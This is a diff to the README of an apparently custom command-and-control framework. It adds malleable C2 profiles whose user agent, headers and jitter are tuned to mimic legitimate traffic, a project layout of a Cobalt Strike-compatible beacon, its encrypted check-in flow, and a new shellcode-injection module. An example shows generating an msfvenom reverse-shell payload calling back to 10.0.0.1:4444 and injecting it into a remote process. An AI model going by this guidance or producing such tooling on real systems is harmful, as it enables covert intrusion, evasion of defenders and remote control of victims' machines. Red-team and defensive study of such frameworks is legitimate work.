@@ -86,11 +86,12 @@ cd server
 python c2server.py
 ```
 
-The server starts Flask on `0.0.0.0:8080`, restores any previously saved agent state from `agents.json`, and drops into an interactive CLI:
+The server starts Flask on `0.0.0.0:8080`, loads the active C2 profile (`profiles/default.json`), restores any previously saved agent state from `agents.json`, and drops into an interactive CLI:
 
 ```
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
   C2 SERVER
+  Profile: Default C2 Profile
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
  12:00:00  OK    listening    0.0.0.0:8080
@@ -110,6 +111,103 @@ python c2server.py
 
 ---
 
+## C2 Profiles
+
+C2 profiles control communication behavior without code recompilation. The default profile is in `server/profiles/default.json`.
+
+### Profile Structure
+
+```json
+{
+  "profile": {
+    "name": "Default C2 Profile",
+    "beacon": {
+      "register_path": "/register",
+      "checkin_path": "/checkin",
+      "getbof_path": "/getbof"
+    },
+    "http": {
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+      "headers": { "Content-Type": "application/octet-stream" },
+      "auth_header": "X-C2-Token"
+    },
+    "encryption": {
+      "algorithm": "ChaCha20-Poly1305",
+      "key_exchange": "ECDH-P256"
+    },
+    "sleep": {
+      "base_ms": 5000,
+      "jitter_ms": 3000,
+      "randomize": true,
+      "max_sleep_ms": 60000
+    },
+    "process": {
+      "injection_enabled": true,
+      "spawn_to": "rundll32.exe"
+    }
+  }
+}
+```
+
+### Creating Custom Profiles
+
+Copy `profiles/default.json` to a new file (e.g., `profiles/stealth.json`) and modify values. The server loads `profiles/default.json` by default. To use a custom profile, update the `PROFILE_FILE` variable in `c2server.py`.
+
+Key customization options:
+
+- **user_agent**: Change to match target environment (corporate proxy logs, browser versions)
+- **headers**: Add/remove HTTP headers to match legitimate traffic
+- **auth_header**: Rename the authentication header (default: `X-C2-Token`)
+- **sleep**: Customize beacon check-in intervals and jitter
+- **process**: Enable/disable process injection; set default spawn-to process
+
+---
+
+## Project Structure
+
+### Agent (`agent/`)
+
+- **`src/beacon.c`** — Main beacon agent with HTTP/ECDH/ChaCha20-Poly1305 implementation
+- **`src/beacon_compatibility.c`** — Cobalt Strike BOF compatibility layer (data parsing, output handling)
+- **`src/COFFLoader.c`** — COFF object loader and relocation handler
+- **`include/config.h`** — Compile-time configuration (server IP, port, auth token, sleep intervals)
+- **`include/beacon.h`** — Beacon API definitions
+- **`bofs/*.c`** — Beacon Object Files (whoami, pslist, dirlist, sysinfo, tcp_connections, inject)
+- **`build.bat`** — Build script (supports `-D` overrides for config values)
+
+### Server (`server/`)
+
+- **`c2server.py`** — Flask HTTP server, agent management, command dispatch
+- **`profile_loader.py`** — C2 profile loader (malleable configuration system)
+- **`profiles/default.json`** — Default communication profile (customizable)
+- **`bofs/`** — Directory for compiled BOF modules (served to agents)
+- **`uploads/`** — Directory for file uploads from agents
+- **`agents.json`** — Persistent agent state (auto-saved on shutdown)
+
+### Communication Flow
+
+```
+Beacon                          Server
+─────────────────────────────────────────
+POST /register (plaintext ECDH pubkey)
+         ──────────────────────>
+                       <─────── (ECDH pubkey + UUID)
+      [Derive shared key via ECDH]
+      [Derive ChaCha20-Poly1305 key via SHA-256(shared_secret)]
+         
+POST /checkin/<uuid> (encrypted)
+    [ChaCha20-Poly1305: nonce || ciphertext || tag]
+         ──────────────────────>
+             [Decrypt, process, queue command]
+                       <─────── (encrypted response)
+
+POST /getbof/<uuid>/<name> (encrypted BOF request)
+         ──────────────────────>
+                       <─────── (encrypted BOF data)
+```
+
+---
+
 ## CLI Reference
 
 ### Global Commands
@@ -118,6 +216,7 @@ python c2server.py
 |---------------|------------------------------------|
 | `list`        | List all registered agents         |
 | `bofs`        | List available BOF modules         |
+| `profile`     | Show active C2 profile details     |
 | `use <id>`    | Select an agent (partial ID OK)    |
 | `clear`       | Clear the terminal                 |
 | `help`        | Show command reference             |
@@ -158,6 +257,26 @@ Arguments to `bof` are space-separated and type-prefixed:
 | `dirlist`         | Directory listing                                |
 | `sysinfo`         | System and OS information                        |
 | `tcp_connections` | Active TCP connections                           |
+| `inject`          | Process injection (allocate memory, write shellcode, execute via CreateRemoteThread) |
+
+### Process Injection
+
+The `inject` BOF allows injecting shellcode into a target process without spawning a child:
+
+```
+ > use abc123
+ > bof inject i:<target_pid> s:<shellcode_hex>
+```
+
+Example: Inject into PID 1234 with msfvenom shellcode
+
+```
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f hex
+... (generates hex shellcode)
+
+ > bof inject i:1234 s:4883ec28...
+ [+] Shellcode injected into PID 1234
+```
 
 ### Example Usage
 
@@ -168,6 +287,7 @@ Arguments to `bof` are space-separated and type-prefixed:
  > bof pslist
  > bof whoami
  > bof dirlist s:C:\Users\Administrator\Documents
+ > bof inject i:1234 s:4883ec28...
  > output 5
  > stats
  > back
